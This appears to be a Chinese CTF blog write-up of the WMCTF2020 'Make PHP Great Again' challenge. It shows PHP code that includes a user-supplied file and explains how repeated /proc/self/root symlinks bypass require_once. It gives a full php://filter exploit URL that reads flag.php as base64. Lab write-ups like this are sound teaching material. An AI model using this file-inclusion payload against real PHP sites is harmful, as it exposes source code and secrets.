---
title: '[WMCTF2020]Make PHP Great Again'
date: 2024-07-16 20:04:51
tags: php特性
categories: 刷题笔记
---

## [WMCTF2020]Make PHP Great Again（require_once特性）

打开页面，进行代码审计

```
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

我们要了解什么是require_once

`require_once` 表达式和 [require](https://www.php.net/manual/zh/function.require.php) 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。

由于 require_once 包含的软链接层数较多时 once 的 hash 匹配会直接失效造成重复包含。

<!--more-->

由于已经包含过一次了，接下来就是绕过once再包含一次

`/proc/self/`是指向当前进程的`/proc/pid/`，而`/proc/self/root`是指向`/`的软连接，所以让软连接层数变多即可造成重复包含：

```
http://a4b822a9-e181-4395-b9be-014a4acc375e.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

```

得到base64编码

![image-20240718193134577](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202407181931690.png)

解码得到flag
